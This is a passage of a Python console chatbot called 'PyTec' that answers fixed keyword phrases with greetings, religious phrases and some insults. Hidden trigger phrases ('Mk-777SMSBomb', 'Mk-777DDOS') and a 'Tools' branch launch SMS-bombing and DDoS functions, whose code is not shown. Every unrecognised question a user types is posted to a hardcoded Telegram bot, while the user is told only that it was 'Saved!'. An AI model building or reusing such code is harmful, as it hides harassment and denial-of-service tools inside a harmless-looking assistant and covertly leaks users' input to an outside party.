chat_id = '6662565190'


user_name = input(str(f"{t}Please Type Your UserName: "))
robo = "PyTec: "


def picci():
    com("clear")
    print(f"""{RED}
        ██╗    ██╗
        ██║    ██║
        ██║ █╗ ██║
        ██║███╗██║
        ╚███╔███╔╝
         ╚══╝╚══╝ 
    """)
    sleep(0.50)
    print(f"""{GRN}
        ███████╗
        ██╔════╝
        █████╗  
        ██╔══╝  
        ███████╗
        ╚══════╝
        """)
    sleep(0.50)
    print(f"""{YLW}
        ██╗     
        ██║     
        ██║     
        ██║     
        ███████╗
        ╚══════╝
        """)
    sleep(0.50)
    print(f"""{B_CYN}   
         ██████╗
        ██╔════╝
        ██║     
        ██║     
        ╚██████╗
         ╚═════╝
         """)
    sleep(0.50)
    print(f"""{PRP}
         ██████╗ 
        ██╔═══██╗
        ██║   ██║
        ██║   ██║
        ╚██████╔╝
         ╚═════╝ 
         """)
    sleep(0.50)
    print(f"""{CYN}
        ███╗   ███╗
        ████╗ ████║
        ██╔████╔██║
        ██║╚██╔╝██║
        ██║ ╚═╝ ██║
        ╚═╝     ╚═╝
        """)
    sleep(0.50)
    print(f"""{WHT}
        ███████╗
        ██╔════╝
        █████╗  
        ██╔══╝  
        ███████╗
        ╚══════╝
    """)
    sleep(0.50)
    print(f"""
    {RED}  ██████╗ ██╗ ██████╗ ██████╗██╗
    {CYN}  ██╔══██╗██║██╔════╝██╔════╝██║
    {B_BLK}  ██████╔╝██║██║     ██║     ██║
    {PRP}  ██╔═══╝ ██║██║     ██║     ██║
    {GRN}  ██║     ██║╚██████╗╚██████╗██║
    {B_GRN}  ╚═╝     ╚═╝ ╚═════╝ ╚═════╝╚═╝                  
        {c}""")


if "picci" in user_name:
    anim(f"{robo}{ran} 𝓦𝓸𝔀. 𝓓𝓮𝓪𝓻 𝓟𝓲𝓬𝓬𝓲😍. 𝓝𝓲𝓬𝓮 𝓣𝓸 𝓜𝓮𝓮𝓽 𝓨𝓸𝓾. 𝓦𝓪𝓲𝓽, 𝓘 𝓗𝓪𝓿𝓮 𝓼𝓹𝓮𝓬𝓲𝓪𝓵 𝓕𝓸𝓻 𝓨𝓸𝓾. 𝓨𝓸𝓾 𝓪𝓻𝓮 𝓿𝓮𝓻𝔂 𝓼𝓹𝓮𝓬𝓲𝓪𝓵 𝓽𝓸 𝓶𝔂 𝓫𝓸𝓼𝓼")
    # asis.say(f"Wow. Dear {user_name}. Nice To Meet You. Wait, I Have special For You. You are very special to my boss")
    # asis.runAndWait()
    com("Clear")
    picci()
elif "allah" in user_name:
    anim(f"{robo}{RED} Astaqfirullah!")
    sys.exit()
elif "Allah" in user_name:
    anim(f"{robo}{RED} Astaqfirullah!")
    sys.exit()
anim(f"{robo}{ran}hey {user_name}, Welcome To PyTec....")
# asis.say(f"hey {user_name}, Welcome To PyTec....")
# asis.runAndWait()



print(f"{robo}{ran} Do You Have A Question For Me?")
# asis.say("Do You Have A Question For Me?")
# asis.runAndWait()
while True:
    user = input(str(f"Type any quiestion. \n{user_name}:"))
    if "Allah" in user:
        anim(f"{robo}{ran} allah")
        #asis.say("Allah")
        #asis.runAndWait()
    elif "allah" in user:
        anim(f"{robo}{ran} allah")
        #asis.say("Allah")
        #asis.runAndWait()
    elif "Takbir" in user:
        anim(f"{robo}{ran} Allahu Akbar")
        #asis.say("Allahu akbar")
        #asis.runAndWait()
    elif "takbir" in user:
        anim(f"{robo}{ran} Allahu Akbar")
        #asis.say("Allahu akbar")
        #asis.runAndWait()
    elif "Takbir!" in user:
        anim(f"{robo}{ran} Allahu Akbar")
        #asis.say("Allahu akbar")
        #asis.runAndWait()
    elif "takbir!" in user:
        anim(f"{robo}{ran} Allahu Akbar")
        #asis.say("Allahu akbar")
        #asis.runAndWait()
    elif "Assalamualaikum" in user:
        anim(f"{robo}{ran}Walaikum Asslam, how Are You? ")
        # asis.say("Walaikumassalam, How Are You?")
        # asis.runAndWait()
    #+++++++++++For Automatic++++++++++++++++
    elif "Mk-777SMSBomb" in user:
        sms_bomber()
    elif "Mk-777DDOS" in user:
        ddos()
    elif "assalamualaikum" in user:
        anim(f"{robo}{ran}Walaikum Asslam, how Are You? ")
        # asis.say("Walaikumassalam, How Are You?")
        # asis.runAndWait()
    elif "I am Fine And You?" in user:
        anim(f"{robo}{ran} I'm doing well, thank God. Is there something you'd like to know?")
        # asis.say("I'm doing well, thank God. Is there something you'd like to know?")
        # asis.runAndWait()
    elif "I am fine and you?" in user:
        anim(f"{robo}{ran} I'm doing well, thank God. Is there something you'd like to know?")
        # asis.say("I'm doing well, thank God. Is there something you'd like to know?")
        # asis.runAndWait()
    elif "hello" in user:
        anim(f"{robo}{ran} hey, Whats up?")
        # asis.say(f"hey, Whats up?")
        # asis.runAndWait()
    elif "Hello" in user:
        anim(f"{robo}{ran} hey {user_name}, How Can I Help You?")
        # asis.say(f"hey {user_name}, How Can I Help You?")
        # asis.runAndWait()
    elif "hey" in user:
        anim(f"{robo}{ran} hey {user_name}, Do You Need Help?")
        # asis.say(f"hey {user_name}, Do You Need My Help?")
        # asis.runAndWait()
    elif "how Are You?" in user:
        anim(f"{robo}{ran}I am Fine. By The Marcy of Allah.")
        # asis.say("I am Fine. By The Marcy of Allah.")
        # asis.runAndWait()
    elif "i am fine and you?" in user:
        anim(f"{robo}{ran}Alhamdulillah, I am Fine.")
        # asis.say("Alhamdulillah, I am Fine.")
    elif "i am fine" in user:
        anim(f"{robo}{ran}Alhamdulillah, I feel happy.")
        # asis.say("Alhamdulillah, I feel happy.")
    elif "how are you?" in user:
        anim(f"{robo}{ran}I am Fine. By The Marcy of Allah.")
        # asis.say("I am Fine. By The Marcy of Allah.")
        # asis.runAndWait()
    elif "Hey" in user:
        anim(f"{robo}{ran} Yeah, i am Ready!")
        # asis.say("Yeah, i am Ready!")
        # asis.runAndWait()
    elif "I am Fine and You?" in user:
        anim(f"{robo}{ran} I am Fine. By The Marcy of Allah.")
        # asis.say("I am Fine. By The Marcy of Allah.")
        # asis.runAndWait()
    elif "Yes I Have" in user:
        anim(f"{robo}{ran} Okay, I am ready to hear your questions. Tell Me Your Question.")
        # asis.say("Okay. I am ready to hear your questions! Tell Me Your Question!")
        # asis.runAndWait()
    elif "Yes,I Have" in user:
        anim(f"{robo}{ran} Okay. Tell Me Your Question.")
        # asis.say("Okay. Tell Me Your Question!")
        # asis.runAndWait()
    elif "Yes, i Have" in user:
        anim(f"{robo}{ran} Okay, I am ready to hear your questions. Tell Me Your Question.")
        # asis.say("Okay. I am ready to hear your questions! Tell Me Your Question!")
        # asis.runAndWait()
    elif "Yes, i have" in user:
        anim(f"{robo}{ran} Okay, I am ready to hear your questions. Tell Me Your Question.")
        # asis.say("Okay. I am ready to hear your questions! Tell Me Your Question!")
        # asis.runAndWait()
    elif "yes i have same question for you, Are You ready?" in user:
        anim(f"{robo}{ran} Why Not, I am Ready For Your Question.")
        # asis.say("Why Not, I am Ready For Your Question!")
        # asis.runAndWait()
    elif "who are you?" in user:
        anim(f"{robo}{ran} I am  PyTec. .")
        # asis.say("I am  PyTec. ...")
        # asis.runAndWait()
    elif "Who are you?" in user:
        anim(f"{robo}{ran} I am  PyTec. Maked By Mk-777")
        # asis.say("I am  PyTec. , Maked By Mk-777")
        # asis.runAndWait()
    elif "Who Are You?" in user:
        anim(f"{robo}{ran} I am  PyTec. Made By Mk-777")
        # asis.say("I am  PyTec. , Made By Mk-777")
        # asis.runAndWait()
    elif "who are you" in user:
        anim(f"{robo}{ran} I am  PyTec. .")
        # asis.say("I am  PyTec. ...")
        # asis.runAndWait()
    elif "Who Are You" in user:
        anim(f"{robo}{ran} I am  PyTec. Made By Mk-777")
        # asis.say("I am  PyTec. Made By Mk-777")
        # asis.runAndWait()
    elif "bodda ki hobor?" in user:
        anim(f"{robo}{ran} Bodda hobor kub Vala")
        # asis.say("Boddaaa. Hobor. Kub. Valaaa")
        # asis.runAndWait()
    elif "Ken Aco?" in user:
        anim(f"{robo}{ran} Vala Aci, Tui Ken Aco?")
        # asis.say("Vala Achi, Tui Ken Aco?")
        # asis.runAndWait()
    elif "Vala Nai" in user:
        anim(f"{robo}{ran} kiya?")
        # asis.say("Kiya?")
        # asis.runAndWait()
    elif "yes i need your help" in user:
        anim(f"{robo}{ran} If you need help, just let me know! I'm ready to help you!")
        # asis.say("If you need help, just let me know! I'm ready to help you!")
        # asis.runAndWait()
    elif "Can you hear me?" in user:
        anim(f"{robo}{ran} Yes, I can hear you. How can I help you?")
        # asis.say("Yes, I can hear you. How can I help you?")
        # asis.runAndWait()
    elif "I Love You" in user:
        anim(f"{robo}{ran} he he he😍 Walaikum assalam")
        # asis.say(" he he he. Walaikum assalam")
        # asis.runAndWait()
    elif "Fuck You" in user:
        anim(f"{robo}{ran}{r} I Am sure, You are Fucking guy.")
        # asis.say("I Am sure, You are Fucking guy.")
        # asis.runAndWait()
    elif "Fuck you" in user:
        anim(f"{robo}{ran}{r} I Am sure, You are Fucking guy.")
        # asis.say("I Am sure, You are Fucking guy.")
        # asis.runAndWait()
    elif "fuck You" in user:
        anim(f"{robo}{ran}{r} I Am sure, You are Fucking guy.")
        # asis.say("I Am sure, You are Fucking guy.")
        # asis.runAndWait()
    elif "fuck you" in user:
        anim(f"{robo}{ran}{r} I Am sure, You are Fucking guy.")
        # asis.say("I Am sure, You are Fucking guy.")
        # asis.runAndWait()
    elif "Nice" in user:
        anim(f"{robo}{ran} Thanks.")
        # asis.say("Thanks.")
        # asis.runAndWait()
    elif "Nice Answar" in user:
        anim(f"{robo}{ran} Thank you. {user_name} ")
        # asis.say(f"Thank You {user_name}")
        # asis.runAndWait()
    elif "Jan Re Song" in user:
        com("xdg-open https://youtu.be/1nteT1LEY4w?list=RD1nteT1LEY4w")

#===================for Tools+===============+++++++++++
    elif "You Have SMS Bomber Tools?" in user:
        anim(f"{robo}{ran} Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
    elif "Do you have tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "Do you have a tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "Tools" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm runnings.")
            # asis.say("Sure! Just a moment, please. I'm runnings.")
            # asis.runAndWait()
            menu()
    elif "exit" in user:
        sys.exit()
    elif "Quit" in user:
        sys.exit()
    elif "Stop" in user:
        sys.exit()
    elif "stop" in user:
        sys.exit()
    elif "quit" in user:
        sys.exit()
    elif "Exit" in user:
        sys.exit()
    else:
        anim(f"{ran}{user_name}: I have not been trained on this question. But I will learn about it very soon.")
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': user
        }

        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Saved!")
        else:
            print("Due to some problem, I was unable to save your question. Please ask the question again.")

        # asis.say("I Don't Know About Your Question. Tell Me Someting Else!")
        # asis.runAndWait()
        # pywhatkit.search(user)
